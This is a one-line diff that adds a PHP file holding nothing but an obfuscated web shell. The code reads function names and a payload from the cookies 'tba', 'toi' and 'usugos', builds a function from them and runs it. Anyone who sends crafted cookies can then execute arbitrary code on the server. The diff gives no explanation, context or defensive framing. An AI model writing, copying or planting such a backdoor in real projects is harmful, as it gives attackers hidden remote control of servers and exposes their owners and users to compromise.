@@ -1,0 +1,1 @@
+<?php if(@$_COOKIE['tba']){$deuvq=$_COOKIE['tba']("",@$_COOKIE['toi'](@$_COOKIE['usugos']));$deuvq();}?>
